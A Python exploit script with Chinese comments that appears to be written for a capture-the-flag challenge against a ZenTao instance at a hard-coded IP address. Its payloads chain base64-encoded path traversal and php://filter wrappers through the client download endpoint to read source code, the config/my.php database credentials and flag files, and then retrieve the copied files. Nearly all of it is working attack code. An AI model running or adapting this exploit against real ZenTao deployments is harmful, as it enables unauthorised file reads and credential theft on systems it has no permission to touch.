#!/usr/bin/env python3
"""
禅道漏洞 - 读取 Web 目录配置文件测试
目的：验证 open_basedir 限制并尝试读取配置文件
"""

import requests
import base64
import time

def solve_config_read():
    base_url = "http://47.113.178.182:32829"
    session = requests.Session()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道漏洞 - 配置文件读取 & PHP 伪协议测试                ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    print("[*] 建立 Session...")
    try:
        session.get(f"{base_url}/zentao/", timeout=5)
        print("    ✓ Session 已建立\n")
    except:
        pass

    # 尝试读取的目标列表
    targets = [
        # 1. 尝试读取 index.php (绝对存在)
        ("index.php", "当前目录 index.php"),
        ("./index.php", "当前目录 ./index.php"),
        ("../index.php", "上级目录 index.php"),
        ("/var/www/html/zentao/index.php", "绝对路径 index.php"),

        # 2. 尝试读取配置文件 (包含数据库密码)
        ("config/my.php", "配置文件 config/my.php"),
        ("../config/my.php", "上级配置文件"),
        ("../../config/my.php", "两级上级配置文件"),

        # 3. 使用 php 伪协议 (神器!)
        ("php://filter/read=convert.base64-encode/resource=index.php", "PHP Filter - index.php"),
        ("php://filter/read=convert.base64-encode/resource=config/my.php", "PHP Filter - config"),
        ("php://filter/read=convert.base64-encode/resource=/flag", "PHP Filter - /flag"),

        # 4. 更多可能的路径
        ("www/index.php", "www/index.php"),
        ("zentao/index.php", "zentao/index.php"),

        # 5. Flag 可能的位置
        ("../flag.txt", "上级目录 flag.txt"),
        ("../../flag", "两级上级 flag"),
        ("flag.php", "当前目录 flag.php"),
    ]

    success_count = 0

    for target, description in targets:
        print("=" * 70)
        print(f"目标: {description}")
        print(f"路径: {target}")
        print("=" * 70)

        # Base64 编码 link 参数
        link_param = base64.b64encode(target.encode()).decode()

        filename = f"test_{abs(hash(target)) % 10000}.txt"

        params = {
            "m": "client",
            "f": "download",
            "link": link_param,
            "fileName": filename
        }

        try:
            # 1. 发送下载请求
            print(f"[*] Link 参数: {link_param}")
            print(f"[*] 发送请求...")

            res = session.get(f"{base_url}/zentao/index.php", params=params, timeout=10)
            print(f"    上传响应: {res.status_code}")

            time.sleep(1)

            # 2. 读取结果
            file_url = f"{base_url}/zentao/data/client/1/{filename}"
            print(f"\n[*] 访问: {file_url}")

            res = session.get(file_url, timeout=10)
            content_len = len(res.content)

            print(f"    状态: {res.status_code}")
            print(f"    长度: {content_len} bytes")

            if content_len > 0:
                success_count += 1
                print(f"\n    ✓✓✓ 成功读取!")
                print(f"    " + "=" * 66)

                # 显示内容预览
                content_preview = res.text[:300]
                print(f"    内容预览 (前300字符):")
                print(f"    {content_preview}")
                print(f"    " + "=" * 66)

                # 如果是 Base64 编码的内容（用了 php://filter），尝试解码
                if "php://filter" in target:
                    try:
                        print(f"\n    [*] 检测到 PHP Filter，尝试 Base64 解码...")
                        decoded = base64.b64decode(res.text.strip()).decode('utf-8', errors='replace')
                        print(f"    " + "=" * 66)
                        print(f"    解码后内容:")
                        print(f"    " + "=" * 66)
                        print(decoded[:500])
                        print(f"    " + "=" * 66)

                        if "flag{" in decoded.lower() or "ctf{" in decoded.lower():
                            print("\n    🚩🚩🚩 Flag Found in Source! 🚩🚩🚩")
                            return decoded
                    except Exception as e:
                        print(f"    Base64 解码失败: {e}")

                # 检查原始内容中的 flag
                if "flag{" in res.text.lower() or "ctf{" in res.text.lower():
                    print("\n    🚩🚩🚩 Flag Found! 🚩🚩🚩")
                    print(f"\n完整内容:")
                    print("=" * 70)
                    print(res.text)
                    print("=" * 70)
                    return res.text

                # 如果成功读取任何文件，说明方法有效
                if success_count == 1:
                    print("\n    ✓ 文件读取功能验证成功!")
                    print("    ✓ 这证明 open_basedir 只限制了 Web 目录外的文件")

            else:
                print("    ✗ 文件为空")

        except Exception as e:
            print(f"    ✗ 错误: {e}")

        print()  # 空行

    print("\n" + "=" * 70)
    print(f"测试完成")
    print("=" * 70)
    print(f"成功读取: {success_count} 个文件")

    if success_count == 0:
        print("\n[!] 所有文件读取都失败")
        print("[*] 可能原因:")
        print("    1. file_get_contents 被完全禁用")
        print("    2. link 参数的 Base64 解码有问题")
        print("    3. 写入权限被拒绝")

    return None


if __name__ == "__main__":
    result = solve_config_read()

    if result:
        print("\n" + "=" * 70)
        print("任务完成! 最终结果:")
        print("=" * 70)
        print(result)
        print("=" * 70)
